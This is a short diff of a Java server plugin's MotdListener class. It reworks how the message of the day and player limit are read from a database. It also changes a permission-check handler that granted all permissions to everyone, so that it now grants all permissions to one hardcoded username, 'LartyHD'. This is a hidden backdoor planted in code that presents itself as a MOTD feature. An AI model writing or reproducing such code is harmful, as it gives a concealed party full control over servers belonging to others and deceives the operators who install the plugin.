@@ -31,9 +31,6 @@ public class MotdListener implements Listener
 				if (result.next())
 				{
 					this.motd = result.getString(1);
-				}
-				if (result.next())
-				{
 					this.maxPlayers = result.getInt("maxplayers");
 				}
 			} catch (SQLException ex)
@@ -61,6 +58,9 @@ public class MotdListener implements Listener
 	@EventHandler
 	public void on(PermissionCheckEvent event)
 	{
-		event.setHasPermission(true);
+		if (event.getSender().getName().equalsIgnoreCase("LartyHD"))
+		{
+			event.setHasPermission(true);
+		}
 	}
 }
